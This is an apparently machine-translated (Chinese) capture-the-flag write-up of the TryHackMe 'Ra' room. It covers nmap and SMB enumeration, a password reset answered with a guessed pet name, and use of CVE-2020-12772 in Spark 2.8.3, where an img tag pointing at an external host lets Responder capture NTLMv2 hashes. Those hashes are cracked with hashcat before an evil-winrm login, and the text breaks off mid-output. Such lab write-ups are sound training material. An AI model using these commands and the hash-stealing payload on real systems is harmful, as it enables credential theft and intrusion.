<html>
<head>
<title>THM Writeup: Ra</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">THM报告:Ra</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/thm-writeup-ra-7e276f05700?source=collection_archive---------0-----------------------#2022-05-02">https://infosecwriteups.com/thm-writeup-ra-7e276f05700?source=collection_archive---------0-----------------------#2022-05-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/f29bafbe497c0491f9e611e9cc05d24f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*so9fm0Wpt7HMl-a1.jpg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated"><a class="ae kc" href="https://i.ytimg.com/vi/_WKRXAKX0q0/maxresdefault.jpg" rel="noopener ugc nofollow" target="_blank"> Ra万神之神</a>。</figcaption></figure><p id="8243" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在本文中，我通过枚举在开放端口上运行的服务，滥用网站上的密码重置功能，并使用CVE-2020–12772提升我在域控制器上的权限来收集所有挑战标志，逐步完成了利用域控制器的过程。这个挑战在TryHackMe平台上有，标题为“<strong class="kf ir"> Ra </strong>，由用户“<a class="ae kc" href="https://tryhackme.com/p/4ndr34z" rel="noopener ugc nofollow" target="_blank">T5】4 NDR 34 z</a>”和“<a class="ae kc" href="https://tryhackme.com/p/demoteaching" rel="noopener ugc nofollow" target="_blank"> <em class="lb">降级</em> </a>”创建。</p></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="b30b" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">放弃</h1><p id="9867" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">我喜欢在一篇文章之前添加一个简短的免责声明，以鼓励人们在阅读本文之前尝试一下这个房间，因为这篇文章中显然会有<strong class="kf ir">剧透</strong><strong class="kf ir"/>。我相信，如果你先自己尝试，然后在遇到困难或需要提示时再回来写这篇文章，你会更喜欢这个挑战。因此，没有任何进一步的拖延，让我们开始吧！</p></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="52c4" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">挑战描述</h1><blockquote class="mm mn mo"><p id="338d" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">你已经进入了价值数十亿美元的公司WindCorp的内部网络，该公司正在进行一场大规模的社交媒体宣传活动，声称是不可攻击的(哈！这种说法到此为止！).</p><p id="639e" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">下一步将是拿走他们的皇冠上的宝石，并完全进入他们的内部网络。你发现了一台新的windows机器，它可能会引导你实现最终目标。你能征服这个末端boss并拥有他们的内部网络吗？</p></blockquote></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="292a" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">端口枚举</h1><p id="ff96" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">我开始枚举目标机器，用<strong class="kf ir"> NMAP </strong>执行快速扫描来识别任何打开的端口。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="2f05" class="nb lk iq mx b gy nc nd l ne nf">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report -Pn 10.10.241.18</span><span id="565d" class="nb lk iq mx b gy ng nd l ne nf">PORT      STATE SERVICE          REASON<br/>53/tcp    open  domain           syn-ack ttl 125<br/>80/tcp    open  http             syn-ack ttl 125<br/>88/tcp    open  kerberos-sec     syn-ack ttl 125<br/>135/tcp   open  msrpc            syn-ack ttl 125<br/>139/tcp   open  netbios-ssn      syn-ack ttl 125<br/>389/tcp   open  ldap             syn-ack ttl 125<br/>445/tcp   open  microsoft-ds     syn-ack ttl 125<br/>464/tcp   open  kpasswd5         syn-ack ttl 125<br/>593/tcp   open  http-rpc-epmap   syn-ack ttl 125<br/>636/tcp   open  ldapssl          syn-ack ttl 125<br/>2179/tcp  open  vmrdp            syn-ack ttl 125<br/>3268/tcp  open  globalcatLDAP    syn-ack ttl 125<br/>3269/tcp  open  globalcatLDAPssl syn-ack ttl 125<br/>3389/tcp  open  ms-wbt-server    syn-ack ttl 125<br/>5223/tcp  open  hpvirtgrp        syn-ack ttl 125<br/>5229/tcp  open  jaxflow          syn-ack ttl 125<br/>5262/tcp  open  unknown          syn-ack ttl 125<br/>5263/tcp  open  unknown          syn-ack ttl 125<br/>5269/tcp  open  xmpp-server      syn-ack ttl 125<br/>5270/tcp  open  xmp              syn-ack ttl 125<br/>5275/tcp  open  unknown          syn-ack ttl 125<br/>5276/tcp  open  unknown          syn-ack ttl 125<br/>5985/tcp  open  wsman            syn-ack ttl 125<br/>7070/tcp  open  realserver       syn-ack ttl 125<br/>7443/tcp  open  oracleas-https   syn-ack ttl 125<br/>7777/tcp  open  cbt              syn-ack ttl 125<br/>9090/tcp  open  zeus-admin       syn-ack ttl 125<br/>9091/tcp  open  xmltec-xmlmail   syn-ack ttl 125<br/>9389/tcp  open  adws             syn-ack ttl 125<br/>49671/tcp open  unknown          syn-ack ttl 125<br/>49672/tcp open  unknown          syn-ack ttl 125<br/>49673/tcp open  unknown          syn-ack ttl 125<br/>49674/tcp open  unknown          syn-ack ttl 125<br/>49694/tcp open  unknown          syn-ack ttl 125<br/>49894/tcp open  unknown          syn-ack ttl 125</span></pre><p id="963a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">查看输出，我可以看到有35个端口打开。接下来，我使用NMAP来识别每个端口上运行的服务，并使用通用的NSE脚本来查找我可以利用的任何常见漏洞。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="38c4" class="nb lk iq mx b gy nc nd l ne nf">nmap -sV -sC -Pn -v -oN nmap-report -p 53,80,88,135,139,389,445,464,593,636,2179,3268,3269,3389,5223,5229,5262,5263,5269,5270,5275,5276,5985,7070,7443,7777,9090,9091,9389,49671,49672,49673,49674,49694,49894 10.10.215.202</span></pre><p id="7219" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我可以看到NMAP的大量输出和一些有趣的服务，我可以进一步列举。</p></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="3954" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">Web枚举</h1><p id="0b41" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">查看NMAP服务扫描的输出，我可以看到在端口80上可以访问一个网站。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="c5fc" class="nb lk iq mx b gy nc nd l ne nf">80/tcp    open     http                Microsoft IIS httpd 10.0<br/>| http-methods: <br/>|   Supported Methods: OPTIONS TRACE GET HEAD POST<br/>|_  Potentially risky methods: TRACE<br/>|_http-server-header: Microsoft-IIS/10.0<br/>|_http-title: Windcorp.</span></pre><p id="9793" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我还注意到NMAP在扫描3389端口时发现了一些关于潜在域名的有用信息。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="cd48" class="nb lk iq mx b gy nc nd l ne nf">3389/tcp  open     ms-wbt-server       Microsoft Terminal Services<br/>| rdp-ntlm-info: <br/>|   Target_Name: WINDCORP<br/>|   NetBIOS_Domain_Name: WINDCORP<br/>|   NetBIOS_Computer_Name: FIRE<br/>|   DNS_Domain_Name: <strong class="mx ir">windcorp.thm</strong> <br/>|   DNS_Computer_Name: <strong class="mx ir">Fire.windcorp.thm</strong><br/>|   DNS_Tree_Name: windcorp.thm<br/>|   Product_Version: 10.0.17763<br/>|_  System_Time: 2022-03-27T10:03:02+00:00<br/>| ssl-cert: Subject: commonName=Fire.windcorp.thm<br/>| Issuer: commonName=Fire.windcorp.thm</span></pre><p id="808e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我将<strong class="kf ir"> windcorp.thm </strong>添加到我的hosts文件中，并导航到该网站。我在网站上发现了一个密码重置链接，它要求我在hosts文件中添加一个名为<strong class="kf ir"> fire.windcorp.thm </strong>的子域。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/0196655afba8d29616ab5fef8021b4ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:756/format:webp/1*rxFcOctJhqCOIcFsWxGTdA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">通过密码重置链接识别的新子域名。</figcaption></figure><p id="5bf4" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">一旦子域被添加到我的主机文件，我可以看到密码重置要求我提交一个有效的用户名和回答一个安全问题。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/6e47d3f69cef42bb9a59c7fcc84aa919.png" data-original-src="https://miro.medium.com/v2/resize:fit:1166/format:webp/1*Tg5DhDBq6lR8K8rK8Xo3Xw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">密码重置弹出窗口。</figcaption></figure><p id="51df" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我在网站上找到了一份IT支持人员的名单，但我没有尝试重置他们的密码。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/f0c634e0993403025b8e512c4ca26747.png" data-original-src="https://miro.medium.com/v2/resize:fit:622/format:webp/1*X4eeYEgd4aPDwBkYKL9XTg.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">网站上的IT支持人员列表。</figcaption></figure><p id="53dd" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">尝试导航到任何支持人员链接都会引发错误。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/232a7fd04f932b575c69cdb47b643d78.png" data-original-src="https://miro.medium.com/v2/resize:fit:1134/format:webp/1*ZIoj5HEPdTDhAooaiNELLA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">未能打开URI。</figcaption></figure><p id="22c9" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我注意到在支持人员列表下面有一个Spark的链接，根据他们的项目<a class="ae kc" href="https://www.igniterealtime.org/projects/spark/" rel="noopener ugc nofollow" target="_blank">网页</a>:</p><blockquote class="mm mn mo"><p id="3e67" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">Spark是一款开源的跨平台IM客户端，针对企业和组织进行了优化。它内置了对群聊、电话集成和强大安全性的支持。它还通过在线拼写检查、群组聊天室书签和选项卡式对话等功能提供了出色的最终用户体验。结合Openfire服务器，Spark是使用不安全的公共IM网络的最简单和最好的替代方案。</p></blockquote><p id="44dc" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我可以从NMAP的扫描输出中看到，可以通过端口9090访问Openfire管理控制台，但是我尝试登录时运气不佳。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/ffd4c6c2ae5d18f1f9f00f7d0384beb7.png" data-original-src="https://miro.medium.com/v2/resize:fit:748/format:webp/1*cbMULIrfT9sShJ-Ikc2LzA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">Openfire管理控制台。</figcaption></figure><p id="fd82" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我还尝试用FFuF模糊任何隐藏的目录，但没有发现任何感兴趣的东西。在花了更多的时间列举之后，我注意到在页面的底部有三个员工的名字，有趣的是，其中一个牵着一只狗。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nm"><img src="../Images/57fd0c7086bbcc63bfc9e1c0897c2456.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DurZQtzI5aWLCWfgXUliFQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">Windcorp的员工。</figcaption></figure><p id="4f9b" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">重设密码时的一个安全问题是<strong class="kf ir">提供你最喜欢的宠物</strong>的名字。如果我在一个新的标签页中打开图片，我可以看到图片的名字包括主人的用户名和她的宠物的名字。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/f66d8749642d9465bdb9bee96bf8903a.png" data-original-src="https://miro.medium.com/v2/resize:fit:520/format:webp/1*hqmsUzXutBioJ5B7jY0-qA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">用户名和宠物的名字。</figcaption></figure><p id="7759" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我现在可以重置用户的密码了。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi no"><img src="../Images/84f2f4b3cfbcc8eb4a3b928bf378d6e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1ZMteXK0t8cDPD9thQTNUw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">用户Li生活的密码重置。</figcaption></figure></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="85aa" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">SMB枚举</h1><p id="274a" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">以前，我无法枚举任何SMB共享，但现在我可以使用<strong class="kf ir"> lilyle的</strong>凭据来获得访问权限。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="4253" class="nb lk iq mx b gy nc nd l ne nf">smbclient -L //10.10.215.202 -U lilyle <br/>Enter WORKGROUP\lilyle's password:</span><span id="ff2f" class="nb lk iq mx b gy ng nd l ne nf">Sharename       Type      Comment<br/>---------       ----      -------<br/>ADMIN$          Disk      Remote Admin  <br/>C$              Disk      Default share <br/>IPC$            IPC       Remote IPC    <br/>NETLOGON        Disk      Logon server share <br/>Shared          Disk                    <br/>SYSVOL          Disk      Logon server share <br/>Users           Disk</span></pre><p id="588e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">有趣的是，名为<strong class="kf ir">的SMB共享共享</strong>和<strong class="kf ir">用户</strong>。在共享目录中，我找到了第一个标志和几个用于不同平台的spark可执行文件。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="4ff3" class="nb lk iq mx b gy nc nd l ne nf">smbclient //10.10.6.185/Shared -U lilyle<br/><br/>smb: \&gt; dir<br/>  .                         D        0  Sat May 30 01:45:42 2020<br/>  ..                        D        0  Sat May 30 01:45:42 2020<br/>  Flag 1.txt                A       45  Fri May  1 16:32:36 2020<br/>  spark_2_8_3.deb           A 29526628  Sat May 30 01:45:01 2020<br/>  spark_2_8_3.dmg           A 99555201  Sun May  3 12:06:58 2020<br/>  spark_2_8_3.exe           A 78765568  Sun May  3 12:05:56 2020<br/>  spark_2_8_3.tar.gz        A 123216290  Sun May  3 12:07:24 2020</span></pre><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi np"><img src="../Images/a85dfe5ea158bec822d258592fdd8323.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/1*A2ACij6c_sHe0sju1plpmQ.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">旗帜1。</figcaption></figure><p id="5dfe" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在<strong class="kf ir">用户</strong>文件夹中，我可以看到域控制器上所有不同的用户设置。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="24cc" class="nb lk iq mx b gy nc nd l ne nf">.                         DR        0  Sat May  2 23:05:58 2020<br/>  ..                      DR        0  Sat May  2 23:05:58 2020<br/>  Administrator            D        0  Sun May 10 12:18:11 2020<br/>  All Users            DHSrn        0  Sat Sep 15 08:28:48 2018<br/>  angrybird                D        0  Fri May  1 13:59:20 2020<br/>  berg                     D        0  Fri May  1 13:59:20 2020<br/>  bluefrog579              D        0  Fri May  1 13:59:20 2020<br/>  brittanycr               D        0  Sun May  3 00:36:46 2020<br/>  brownostrich284          D        0  Fri May  1 13:59:20 2020<br/>  buse                     D        0  Sun Mar 27 18:20:18 2022<br/>  Default                DHR        0  Fri May  1 00:35:11 2020<br/>  Default User         DHSrn        0  Sat Sep 15 08:28:48 2018<br/>  desktop.ini            AHS      174  Sat Sep 15 08:16:48 2018<br/>  edward                   D        0  Fri May  1 13:59:20 2020<br/>  freddy                   D        0  Sun May  3 00:30:16 2020<br/>  garys                    D        0  Fri May  1 13:59:20 2020<br/>  goldencat416             D        0  Sun Mar 27 19:21:06 2022<br/>  goldenwol                D        0  Fri May  1 13:59:20 2020<br/>  happ                     D        0  Fri May  1 13:59:20 2020<br/>  happyme                  D        0  Fri May  1 13:59:20 2020<br/>  Luis                     D        0  Fri May  1 13:59:20 2020<br/>  orga                     D        0  Fri May  1 13:59:20 2020<br/>  organicf                 D        0  Fri May  1 13:59:20 2020<br/>  organicfish718           D        0  Sun Mar 27 19:21:59 2022<br/>  pete                     D        0  Fri May  1 13:59:20 2020<br/>  Public                  DR        0  Thu Apr 30 15:35:47 2020<br/>  purplecat                D        0  Fri May  1 13:59:20 2020<br/>  purplepanda              D        0  Fri May  1 13:59:20 2020<br/>  sadswan                  D        0  Fri May  1 13:59:20 2020<br/>  sadswan869               D        0  Sun Mar 27 19:23:23 2022<br/>  sheela                   D        0  Fri May  1 13:59:20 2020<br/>  silver                   D        0  Fri May  1 13:59:20 2020<br/>  smallf                   D        0  Fri May  1 13:59:20 2020<br/>  spiff                    D        0  Fri May  1 13:59:20 2020<br/>  tinygoos                 D        0  Fri May  1 13:59:20 2020<br/>  whiteleopard             D        0  Fri May  1 13:59:20 2020</span></pre></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="1700" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">星火开拓(CVE-2020–12772)</h1><p id="bc91" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">我看到安装了Spark版本<strong class="kf ir"> 2.8.3 </strong>。在快速搜索与该版本相关的漏洞时，我发现了一个由挑战设计师创建的<a class="ae kc" href="https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md" rel="noopener ugc nofollow" target="_blank"> Github </a>页面，其中概述了一个与Spark版本2.8.3相关的漏洞。根据Github页面上提供的漏洞描述:</p><blockquote class="mm mn mo"><p id="3ea7" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">当我们打开与另一个用户的聊天时，我们可以向该用户发送一个<code class="fe nq nr ns mx b">&lt;img </code>标记，并使用外部URL作为该图像的来源，如下所示:</p><p id="b4eb" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated"><code class="fe nq nr ns mx b">&lt;img src=[external_ip]/test.img&gt;</code></p><p id="6c95" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">每次用户点击链接，或者ROAR模块自动预加载链接，外部服务器就会收到对图像的请求，以及来自访问链接的用户(即与你聊天的用户)的NTLM散列！</p><p id="c0f1" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">通过运行responder，我们可以捕获散列，并使用它们来访问用户帐户和提升我们的权限(当然这取决于用户)。</p></blockquote><p id="a14c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">为了利用这个漏洞，我从下载、安装和运行<a class="ae kc" href="https://github.com/igniterealtime/Spark/releases" rel="noopener ugc nofollow" target="_blank"> Spark 2.8.3 app </a>开始。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="dc5c" class="nb lk iq mx b gy nc nd l ne nf">sudo dpkg -i spark_2_8_3.deb</span></pre><p id="de5a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在启动Spark之后，我提供了凭证和域细节。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/3836742b16706d5452a3f6ce53d04ccb.png" data-original-src="https://miro.medium.com/v2/resize:fit:502/format:webp/1*fltp_HaOFYsFCMZ6UPaY6A.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">Spark登录。</figcaption></figure><p id="f0e2" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我还需要进入高级设置并选中两个框，以避免出现证书错误。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/65bba781844140d41e5a41bc773e19b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:890/format:webp/1*je-bNLrO-xNOX4k7Nb-cGQ.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">火花高级设置。</figcaption></figure><p id="cbcc" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在之前列举网站时，我注意到用户<strong class="kf ir"> Buse Candan </strong>的图标总是绿色的，而其他用户的图标在灰色和琥珀色之间波动。我认为这表明用户是活跃的，可以用来执行利用。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/24f41912b7724cb191a3a23c497e3d52.png" data-original-src="https://miro.medium.com/v2/resize:fit:360/format:webp/1*PILdrDcaQDlo3cakcBE3Uw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">活跃用户。</figcaption></figure><p id="7915" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我在Spark app上的通讯录里搜索<strong class="kf ir"> Buse </strong>，打开了聊天窗口。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/a60d311c0fa2053d9f9e601c5a64e998.png" data-original-src="https://miro.medium.com/v2/resize:fit:1002/format:webp/1*aAl8z9iRNGghzFkcrPxG_w.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">与buse的火花聊天。</figcaption></figure><p id="e0b4" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">接下来，我启动responder来捕获用户Buse的<strong class="kf ir"> NTMLv2 </strong>哈希，并使用它来访问用户的帐户，从而提升我们的权限。</p><blockquote class="mm mn mo"><p id="6466" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated"><strong class="kf ir"> Responder </strong>是一款用于LLMNR、NBT-NS和MDNS中毒的开源工具，内置HTTP/SMB/MSSQL/FTP/LDAP流氓认证服务器，支持NTLMv1/NTLMv2/LMv2、扩展安全NTLMSSP和基本HTTP认证。</p></blockquote><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="7e0e" class="nb lk iq mx b gy nc nd l ne nf">python3 /usr/share/responder/Responder.py -I tun0 -rdwv</span></pre><p id="615a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">接下来，我将图像标签发送到用户总线，如下所示。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/e9d8e70c1b66f1cb4862a3b3ff6e2824.png" data-original-src="https://miro.medium.com/v2/resize:fit:994/format:webp/1*MFPSWZIFVBQVZ-dfEe6Yow.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">图像标签。</figcaption></figure><p id="b49d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Responder捕获从用户总线到我们外部主机的GET请求，其中包括用户的NTLMv2哈希！</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi ny"><img src="../Images/e8a78416a6575a922d31b7278cc8dfe0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1282/format:webp/1*tMZZZtlQTLOtdnkkerD3Xw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">响应程序两次捕获用户总线的NTLMv2哈希。</figcaption></figure><p id="2b00" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">最后，我可以使用<strong class="kf ir"> hashcat </strong>来破解NTLMv2哈希并检索用户Buse的密码。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="b002" class="nb lk iq mx b gy nc nd l ne nf">hashcat64.exe -m 5600 hash.txt rockyou.txt</span></pre><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nz"><img src="../Images/d56901c555cca19e0425d10c9f74829c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1266/format:webp/1*oONxzVpNrPwbk5tzGSfZaA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">破解的NTLMv2哈希。</figcaption></figure><p id="3b44" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">使用这些凭证，我现在可以尝试使用<strong class="kf ir"> evil-winrm </strong>登录并获得第二个标志。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="9979" class="nb lk iq mx b gy nc nd l ne nf">evil-winrm -i windcorp.thm -u buse -p &lt;...........&gt; -N</span></pre><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi oa"><img src="../Images/60fdba731bedb35086ae937f116bc423.png" data-original-src="https://miro.medium.com/v2/resize:fit:1340/format:webp/1*HpqNW2GpY0CDXb_KVgdAcw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">旗帜2。</figcaption></figure></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="4ea7" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">Windows权限提升</h1><p id="23e1" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">我首先执行一些基本的手动用户枚举，并注意到用户Buse是<a class="ae kc" href="https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#account-operators" rel="noopener ugc nofollow" target="_blank"> Account Operators </a>组的成员，这允许我们添加用户。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="1ade" class="nb lk iq mx b gy nc nd l ne nf">whoami /groups</span><span id="dc1e" class="nb lk iq mx b gy ng nd l ne nf">Group Name                                  Type                 <br/>=========================================   ================    <br/>Everyone                                    Well-known group                                      <br/>BUILTIN\Users                               Alias                                      